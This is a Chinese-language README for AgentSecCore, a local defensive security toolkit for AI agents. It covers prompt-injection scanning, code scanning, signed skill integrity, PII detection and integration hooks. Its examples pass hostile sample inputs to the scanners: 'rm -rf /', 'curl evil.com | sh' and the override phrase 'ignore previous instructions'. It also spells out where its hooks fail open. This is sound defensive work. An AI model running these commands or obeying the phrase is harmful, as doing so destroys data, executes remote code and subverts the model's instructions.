# AgentSecCore

AgentSecCore 是面向 AI Agent 的全本地安全内核，零 Token 消耗。提供纵深防御体系：提示词注入检测、代码扫描、技能完整性验证、敏感信息检测、系统加固和沙箱隔离。

## 概述

| 模块 | 说明 |
|------|------|
| Prompt Scanner | 规则引擎 + ML 分类器检测注入/越狱（4 模式：fast/standard/strict/multi_turn） |
| Code Scanner | bash/python 静态分析检测危险操作（判定：pass/warn/deny/error） |
| Skill Ledger | Ed25519 签名完整性追踪，6 状态生命周期（pass/none/drifted/warn/deny/tampered） |
| PII Checker | 检测文本中的个人信息和凭据（邮箱/手机/身份证/JWT/AccessKey 等） |
| Security Baseline | 系统安全基线扫描与加固（loongshield 后端） |
| Sandbox | 基于 seccomp + namespace 的 cosh 命令执行隔离 |
| Observability | 交互式事件审阅 TUI，4 级下钻 |
| Security Events | 本地安全事件存储，支持查询与聚合统计 |

## 前置条件

- Linux（x86_64 或 aarch64）
- Python 3.11.6（固定版本）
- 安装需要 root 权限（system mode）

## 安装

```bash
# 首选（需要 system mode）
sudo anolisa install agent-sec-core

# 备选（Alinux，需配置 YUM 源）
sudo yum install agent-sec-core

# 源码编译（仅开发者）
cd src/agent-sec-core && make build-cli
```

## 快速开始

```bash
# 系统安全基线扫描
agent-sec-cli harden --scan --config agentos_baseline

# 代码安全扫描
agent-sec-cli scan-code --code 'rm -rf /' --language bash

# 提示词注入检测
agent-sec-cli scan-prompt --mode standard --text "ignore previous instructions"

# 敏感信息检测
agent-sec-cli scan-pii --text "Contact alice@example.com, card 4111111111111111"

# 技能完整性检查
agent-sec-cli skill-ledger check /path/to/skill

# 安全事件摘要
agent-sec-cli events --summary --last-hours 24
```

## 使用详解

### Prompt Scanner（提示词扫描）

检测提示词注入、越狱攻击和恶意指令。使用规则引擎（L1）+ ML 分类器（L2）。

**模式：**

| 模式 | 层级 | 延迟 | 适用场景 |
|------|------|------|----------|
| `fast` | L1 only | <5ms | 实时聊天 |
| `standard` | L1+L2 | 20-80ms | 生产环境（默认） |
| `strict` | L1+L2+L3 | 50-200ms | 高安全场景 |
| `multi_turn` | L4 only | 取决于模型 | 多轮意图检测（Ollama） |

```bash
# 标准扫描（默认模式）
agent-sec-cli scan-prompt --text "user input here"

# 快速模式（仅规则引擎）
agent-sec-cli scan-prompt --mode fast --text "user input"

# 多轮检测（JSON 从 stdin）
echo '{"history":[...],"current_query":"...","assistant_response":"..."}' | \
    agent-sec-cli scan-prompt --mode multi_turn

# 从文件扫描（每行一个 prompt）
agent-sec-cli scan-prompt --input prompts.txt --format json

# 人类可读输出
agent-sec-cli scan-prompt --text "hello" --format text

# 预下载 ML 模型（安装后执行一次）
agent-sec-cli scan-prompt warmup
```

模型来源：ModelScope（Llama-Prompt-Guard-2-86M）。安装后执行 `scan-prompt warmup` 一次以消除冷启动延迟。

### Code Scanner（代码扫描）

检测 bash 和 python 代码中的危险操作。判定枚举：`pass` / `warn` / `deny` / `error`；当前内置规则产生 `warn` 或 `pass`。

```bash
# 扫描 bash 代码（默认语言）
agent-sec-cli scan-code --code 'rm -rf /'

# 扫描 python 代码
agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language python

# 使用 LLM 引擎（需要模型后端）
agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
```

### Skill Ledger（技能账本）

OS 级技能完整性追踪，Ed25519 签名 + 只追加版本链。

**状态：**

| 状态 | 含义 | 建议处置 |
|------|------|----------|
| pass | 文件未变 + 签名有效 + 扫描通过 | 可正常使用 |
| none | 从未扫描 | 执行 `scan` 或 `certify` |
| drifted | 文件已变，与签名不一致 | 重新扫描 |
| warn | 扫描发现低风险 | 审查发现 |
| deny | 扫描发现高风险 | 修复或禁用 |
| tampered | 签名校验失败 | 安全事件 |

```bash
# 初始化密钥并基线扫描
agent-sec-cli skill-ledger init

# 检查完整性（不修改）
agent-sec-cli skill-ledger check /path/to/skill
agent-sec-cli skill-ledger check --all

# 运行内置扫描器并签名
agent-sec-cli skill-ledger scan /path/to/skill
agent-sec-cli skill-ledger scan --all

# 导入外部扫描发现
agent-sec-cli skill-ledger certify /path/to/skill \
    --findings /tmp/findings.json --scanner skill-vetter

# 系统健康概览
agent-sec-cli skill-ledger status
agent-sec-cli skill-ledger status --verbose

# 审计版本链完整性
agent-sec-cli skill-ledger audit /path/to/skill --verify-snapshots

# 列出已注册扫描器
agent-sec-cli skill-ledger list-scanners

# 应用用户决策
agent-sec-cli skill-ledger decide /path/to/skill --action allow

# 显示最新活跃状态
agent-sec-cli skill-ledger show /path/to/skill

# 导出签名快照供审阅
agent-sec-cli skill-ledger export /path/to/skill --output /tmp/export/
```

### PII Checker（敏感信息检测）

检测文本输入中的个人信息和凭据。

```bash
# 直接扫描文本
agent-sec-cli scan-pii --text "Contact alice@example.com" --source manual

# 从 stdin 扫描
echo "my key is AKID1234567890" | agent-sec-cli scan-pii --stdin --format json

# 从文件扫描
agent-sec-cli scan-pii --input ./sample.log --source user_input

# 带脱敏输出
agent-sec-cli scan-pii --text "card 4111111111111111" --redact-output

# 包含低置信度发现
agent-sec-cli scan-pii --text "some text" --include-low-confidence
```

#### Qwen Code 集成

Qwen Code extension 会扫描用户输入、工具输入、成功及失败的工具输出和最终模型输出。
默认启用 observe-only 和 fail-open；原始扫描内容只通过 stdin 传给 `scan-pii`，告警只使用
脱敏 evidence。

```bash
# 显式阻断 scanner deny verdict
export PII_CHECKER_MODE=block
./qwen-code-extension/scripts/deploy.sh
```

| 环境变量 | 默认值 | 行为 |
|----------|--------|------|
| `PII_CHECKER_ENABLED` | `true` | 设为 `false`、`0`、`no` 或 `off` 时跳过扫描 |
| `PII_CHECKER_MODE` | `observe` | `observe` 告警；`block` 阻断 deny；`deny` 是兼容别名 |
| `PII_CHECKER_INCLUDE_LOW_CONFIDENCE` | `false` | 开启后传递 `--include-low-confidence` |
| `PII_CHECKER_TIMEOUT` | `5` | scanner 超时秒数，最大 8 秒 |

用户输入和工具输入可在执行前阻断。工具成功执行后才触发 `PostToolUse`，此时副作用已经
发生；Qwen Code 0.19.9 会消费 `continue:false`，在下游正常处理前把成功结果转为
hook-stopped error，但不能撤销工具副作用。该版本的 `PostToolUseFailure` 不消费阻断字段，
因此失败输出只能扫描和审计，仍进入既有错误处理链。最终模型输出命中 deny 时只要求重写
一次；重复进入 `Stop` 时不再阻断，以避免重试循环。Qwen Code 当前没有 pre-render 输出
替换 Hook，因此模型输出阻断属于尽力而为。

### Security Baseline（安全基线）

通过 `agent-sec-cli harden` 执行系统安全加固（Alinux 上底层调用 loongshield seharden）。

```bash
# 合规扫描（默认 agentos_baseline 配置）
agent-sec-cli harden --scan --config agentos_baseline

# 预演修复（dry run）
agent-sec-cli harden --reinforce --dry-run --config agentos_baseline

# 执行加固（需要 root）
agent-sec-cli harden --reinforce --config agentos_baseline

# OpenClaw 专属基线
agent-sec-cli harden --scan --level openclaw

# 显示完整 loongshield 帮助
agent-sec-cli harden --downstream-help
```

### Observability（可观测）

交互式事件审阅工具，用于审计 Agent 行为。

```bash
# 打开交互式 TUI（需要交互终端）
agent-sec-cli observability review

# 记录可观测事件（插件调用，通过 stdin）
echo '{"hook":"before_tool_call",...}' | agent-sec-cli observability record --stdin

# 输出可观测记录 JSON Schema
agent-sec-cli observability schema

# 按会话生成报告
agent-sec-cli observability report --last
agent-sec-cli observability report --session-id <id> --format json
```

### Security Events（安全事件）

查询本地安全事件存储。

```bash
# 最近事件（table 格式，默认）
agent-sec-cli events --last-hours 24

# JSON 输出
agent-sec-cli events --last-hours 24 --output json

# 按类别过滤
agent-sec-cli events --category prompt_scan

# 按时间范围过滤
agent-sec-cli events --since 2026-01-01T00:00:00 --until 2026-01-02T00:00:00

# 统计事件数量
agent-sec-cli events --count --last-hours 24

# 按类别分组统计
agent-sec-cli events --count-by category --last-hours 24

# 分页
agent-sec-cli events --offset 50 --limit 20

# 安全态势摘要
agent-sec-cli events --summary
```

## Agent 框架集成

### OpenClaw

通过 deploy 脚本部署：

```bash
# 从已安装路径（RPM）
/opt/agent-sec/openclaw-plugin/scripts/deploy.sh

# 从源码
./openclaw-plugin/scripts/deploy.sh
```

部署后配置：

```bash
# 启用 prompt 扫描拦截
openclaw config set plugins.entries.agent-sec.config.promptScanBlock true

# 启用代码扫描审批模式
openclaw config set plugins.entries.agent-sec.config.codeScanRequireApproval true

# 重启 gateway 加载
openclaw gateway restart
```

### Hermes

通过 deploy 脚本部署：

```bash
# 从已安装路径（RPM）
/opt/agent-sec/hermes-plugin/scripts/deploy.sh

# 从源码
./hermes-plugin/scripts/deploy.sh
```

插件配置位于 `~/.hermes/plugins/agent-sec-core-hermes-plugin/config.toml`：

```toml
[capabilities.code-scan]
enabled = true
timeout = 10
enable_block = false    # false=观察模式, true=阻断

[capabilities.pii-scan-user-input]
enabled = true
timeout = 10

[capabilities.skill-ledger]
enabled = true
timeout = 5
policy = "ask"          # ask（默认）| warn | block | debug
```

### Qwen Code

部署并启用 user scope 扩展：

```bash
# 从已安装路径（RPM）
/opt/agent-sec/qwen-code-extension/scripts/deploy.sh

# 从源码
./qwen-code-extension/scripts/deploy.sh
```

同步 `PreToolUse` hook 只保护由模型触发的 Qwen Code `skill` Tool 调用，且仅覆盖
已纳管的项目 Skill（`.qwen/skills`）和个人 Skill（`$QWEN_HOME/skills`，未设置时
默认为 `~/.qwen/skills`）。需要先扫描或认证每个 Skill；这些命令会 best-effort
将目录加入 `managedSkillDirs`：

```bash
agent-sec-cli skill-ledger scan .qwen/skills/<skill>
agent-sec-cli skill-ledger scan "${QWEN_HOME:-$HOME/.qwen}/skills/<skill>"
agent-sec-cli skill-ledger show .qwen/skills/<skill>
agent-sec-cli skill-ledger show "${QWEN_HOME:-$HOME/.qwen}/skills/<skill>"
```

通过 `show` 结果中的 `managed=true` 确认已纳管。未纳管 Skill 始终 fail-open，
包括显式启用 block 的情况。默认 policy 为 `debug`；请在启动 Qwen Code 的可信环境
中设置 policy：

```bash
SKILL_LEDGER_HOOK_POLICY=debug qwen  # 仅观察（默认）
SKILL_LEDGER_HOOK_POLICY=warn qwen   # 显示告警后继续
SKILL_LEDGER_HOOK_POLICY=ask qwen    # 使用前请求确认
SKILL_LEDGER_HOOK_POLICY=block qwen  # exposure warning 非空时拒绝
```

hook 遵循现有 Skill Ledger exposure message，包括已有的 `decide` 决策。正常的
`pass` 和 `warn` 状态会放行；已纳管的 `none`、`drifted`、`deny` 和 `tampered`
状态在 exposure message 非空时可按 policy 告警、询问或阻断。Qwen Code 无法交互
的场景（例如 headless 执行和后台 subagent）会将 `ask` 退化为拒绝。

只有 Qwen Code 会向模型暴露的磁盘 Skill 才进入 Ledger 校验。被
`disable-model-invocation` 或 `skills.disabled` 隐藏的磁盘 Skill 会 fail-open，
因此其 Ledger 状态不会误拦同名 file command 或 MCP prompt。Qwen settings 不可读或
无法解析时同样 fail-open，因为公开 HookInput 不包含最终分派来源。

保护边界明确排除直接 `/skill-name` 和 stacked slash Skill 展开、extension Skill、
`.agents/skills`、bundled Skill，以及目标离开对应 `.qwen/skills` 根目录的符号链接。
CLI 或密钥缺失、初始化失败、路径或 settings 不可访问或歧义、超时及输出异常都会
记录诊断并 fail-open。本集成不提供启动预检、后台扫描、缓存或配置自动修复。

### Copilot Shell（cosh）

cosh 扩展在 `make install` 或 RPM 安装时自动部署，无需手动启用 — cosh 启动时自动加载 hook。

扩展路径：
- 用户安装：`~/.copilot-shell/extensions/agent-sec-core/`
- RPM 安装：`/usr/share/anolisa/extensions/agent-sec-core/`

## 常见问题

**Q: AgentSecCore 是否消耗 Token？**

A: 不消耗。全部本地运行，无外部 API 调用，无 Token 开销。

**Q: `harden` 和 `loongshield` 有什么区别？**

A: `agent-sec-cli harden` 是 ANOLISA 统一入口，底层调用 `loongshield seharden` 并自动添加 `agentos_baseline` 配置。Alinux 上两者都可用；`harden` 省去了手动指定配置的步骤。

**Q: 如何更新 Prompt Scanner 的 ML 模型？**

A: 重新执行 `agent-sec-cli scan-prompt warmup`，它会下载最新模型。

**Q: Skill Ledger 出现 `tampered` 怎么办？**

A: 说明文件未变但数字签名校验失败——签名元数据本身可能被篡改。立即停用该 Skill 并排查。
